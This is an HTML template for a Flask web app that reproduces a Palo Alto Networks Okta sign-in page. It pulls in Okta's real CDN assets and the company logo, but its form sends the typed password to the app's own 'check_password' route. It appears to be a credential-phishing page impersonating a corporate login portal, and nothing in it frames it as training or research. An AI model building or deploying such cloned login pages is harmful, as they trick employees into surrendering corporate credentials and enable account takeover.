<!DOCTYPE html>
<html lang="en">
<head>
    <script src="https://ok4static.oktacdn.com/assets/js/sdk/okta-signin-widget/5.16.0/js/okta-sign-in.min.js" type="text/javascript"></script>
    <link href="https://ok4static.oktacdn.com/assets/js/sdk/okta-signin-widget/5.16.0/css/okta-sign-in.min.css" type="text/css" rel="stylesheet"/>
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
    <link href="https://ok4static.oktacdn.com/assets/loginpage/css/loginpage-theme.fe35d60e3e7ac95814eda9241d23b189.css" type="text/css" rel="stylesheet"/><link href="/api/internal/brand/theme/style-sheet?touch-point=SIGN_IN_PAGE&v=28d025743b8fc0765a7cfe4c08fdf2a9" rel="stylesheet" type="text/css">
    <script>
        var okta = {
            locale: 'en',
            deployEnv: 'PROD'
        };
    </script>
    <meta charset="UTF-8">
    <title>Flask Swiftdoc-1.0</title>
</head>
<body>
<div id="signin-container">
    <main data-se="auth-container" tabindex="-1" id="okta-sign-in" class="auth-container main-container no-beacon" style="display: block;">
        <div class="okta-sign-in-header auth-header">
            <h1>
                <img src="https://ok4static.oktacdn.com/fs/bco/1/fs0d7cvqr2A0elyfF1t7" class="auth-org-logo" alt="Palo Alto Networks Prod logo logo" aria-label="Palo Alto Networks Prod logo logo">
            </h1>
            <div data-type="beacon-container" class="beacon-container">
            </div>
        </div>
        <div class="auth-content">
            <div class="auth-content-inner">
                <div class="primary-auth">
                    <form novalidate="novalidate" method="POST" action="{{url_for('check_password')}}"  data-se="o-form" slot="content" id="form19" class="primary-auth-form o-form o-form-edit-mode">
                        <div data-se="o-form-content" class="o-form-content o-form-theme clearfix">
                            <h2 data-se="o-form-head" class="okta-form-title o-form-head">
                                Sign In
                            </h2>
                            <div class="o-form-error-container" data-se="o-form-error-container">
                            </div>
                            <div class="o-form-fieldset-container" data-se="o-form-fieldset-container">
                                <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-5">
                                    <div data-se="o-form-label" class="okta-form-label o-form-label">
                                        <label for="okta-signin-username">
                                            Username&nbsp;
                                        </label>
                                    </div>
                                    <div data-se="o-form-input-container" class="o-form-input">
                                        <span data-se="o-form-input-username" class="o-form-input-name-username o-form-control okta-form-input-field input-fix">
                                            <input type="text" placeholder="" name="username" id="okta-signin-username" aria-label="" autocomplete="username" aria-invalid="false" aria-required="true" required="" value="{{username or session['username']}}" disabled=''>
                                        </span>
                                    </div>
                                </div>
                                <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-30">
                                    <div data-se="o-form-label" class="okta-form-label o-form-label">
                                        <label for="okta-signin-password">
                                            Password&nbsp;
                                        </label>
                                    </div>
                                    <div data-se="o-form-input-container" class="o-form-input">
                                        <span data-se="o-form-input-password" class="o-form-input-name-password o-form-control okta-form-input-field input-fix">
                                            <input type="password" placeholder="" name="password" id="okta-signin-password" value="" aria-label="" autocomplete="current-password" aria-required="true" required="">
                                        </span>
                                        {% if error %}
                                        <p>
                                            {{error}}
                                        </p>
                                        {% endif %}
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="o-form-button-bar">
                            <input class="button button-primary" type="submit" value="Sign In" id="okta-signin-submit" data-type="save">
                        </div>
                    </form>
                    <div class="auth-footer">
                        <ul class="help-links js-help-links" id="help-links-container" style="display: none;">
                            <li>
                                <a href="#" data-se="forgot-password" class="link js-forgot-password">Forgot password?</a>
                            </li>
                            <li>
                                <a href="#" data-se="unlock" class="link js-unlock">Unlock account?</a>
                            </li>
                            <li>
                                <a href="https://paloaltonetworks.okta.com/help/login" data-se="help-link" class="link js-help-link" rel="noopener noreferrer" target="_blank">Help</a>
                </li>
            </ul>
        </div>
    </div>
    </div>
    </div>
    </main>
</div>
</body>
</html>
